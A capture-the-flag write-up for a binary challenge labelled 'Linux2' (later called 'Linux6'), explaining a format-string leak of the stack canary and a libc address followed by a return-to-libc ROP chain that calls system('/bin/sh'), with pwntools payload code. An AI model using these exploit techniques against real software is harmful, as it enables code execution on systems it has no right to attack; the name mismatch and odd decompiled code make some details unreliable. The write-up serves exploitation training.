# Linux2 CTF Writeup

## Challenge Overview
This challenge involves exploiting a binary protected by a stack canary and using a format string vulnerability to leak sensitive values from the stack. The objective is to leak both the stack canary and a libc address, calculate the base of libc, and use a ROP chain to spawn a shell.

## Analysis

Upon running the binary, the program prints a message requesting a cookie and accepts user input. The format string vulnerability allows me to leak the stack canary and a libc address from the stack. A second `gets()` call allows for a buffer overflow, but only if the canary remains unchanged.

This two-phase input design is what makes the binary exploitable:
1. Format string leak.
2. Canary-aware buffer overflow with return address overwrite.


This reveals a clear structure:
- Stack canary is set and later verified
- Format string vulnerability via `printf(buffer)`
- Classic buffer overflow via `gets(buffer)`

### Key Code Analysis

Based the `gate()` function this can be represented as the following using ghidra:

```c
void gate(void) {
  long canary;
  char buffer[72];
  long canry_on_stack = *(long *)(canary + 0x28);

  puts("Canary on guards shoulder: Gwaaaa! I want a cookie!");
  gets(buffer);
  printf(buffer);  // <-- format string vulnerability
  puts("Give me another one!");
  gets(buffer);    // <-- buffer overflow
  puts("The canary died from poison, the guard attacks you!");

  if (canry_on_stack != *(long *)(canary + 0x28)) {
    __stack_chk_fail();
  }
}
```

## Exploitation and Payload Strategy

### Phase 1: Leak Canary and libc Address

Using `%37$p %39$p`, we can leak the values of:
- `%37$p` → stack canary
- `%39$p` → pointer into libc

```python
canary_libc_leak = '%37$p %39$p'
p.sendline(canary_libc_leak)
canary_leak, libc_leak = p.recvline().strip().split()
canary = int(canary_leak, 16)
libc_base = int(libc_leak, 16) - libc.symbols['__libc_start_main'] - 0x85
```

### Phase 2: Construct Final Payload

With the base of libc and the canary known, we build a ROP chain to call `system("/bin/sh")`:

```python
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
exit_addr = libc_base + libc.symbols['exit']
```

Payload layout:
```python
payload  = b'A' * 72
payload += p64(canary)
payload += b'B' * 8
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
payload += p64(exit_addr)
```

This is then sent after the second prompt:
```python
p.recvuntil(b'Give me another one!')
p.sendline(payload)
```

## Result and Solution

The exploit successfully triggers the intended payload and appears to spawn a shell. However, there is a problem:

The shell is non-interactive input commands (like `ls`, `cat flag.txt`) are not echoed or responded to, indicating a broken or isolated shell environment.

## Conclusion and Lessons

Linux6 is an advanced example that combines:
- Stack canary leaking via format string vulnerabilities
- libc base calculation
- Return-to-libc via ROP


## References
- ![alt text](/img/image-11.png)
- ![alt text](/img/image-12.png)
- ![alt text](/img/image-13.png)
- ![alt text](/img/image-14.png)
- ![alt text](/img/image-15.png)